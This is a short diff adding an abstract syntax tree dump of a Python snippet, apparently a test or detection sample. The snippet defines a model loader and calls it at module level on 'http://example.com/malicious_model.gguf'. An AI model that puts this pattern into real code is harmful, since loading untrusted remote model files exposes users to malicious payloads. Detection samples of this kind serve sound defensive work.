@@ -1,0 +1,38 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='llama_cpp_python')]),
+        FunctionDef(
+            name='load_model',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='model_path')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='model', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='llama_cpp_python', ctx=Load()),
+                            attr='load_model',
+                            ctx=Load()),
+                        args=[
+                            Name(id='model_path', ctx=Load())],
+                        keywords=[])),
+                Return(
+                    value=Name(id='model', ctx=Load()))],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='model', ctx=Store())],
+            value=Call(
+                func=Name(id='load_model', ctx=Load()),
+                args=[
+                    Constant(value='http://example.com/malicious_model.gguf')],
+                keywords=[]))],
+    type_ignores=[])
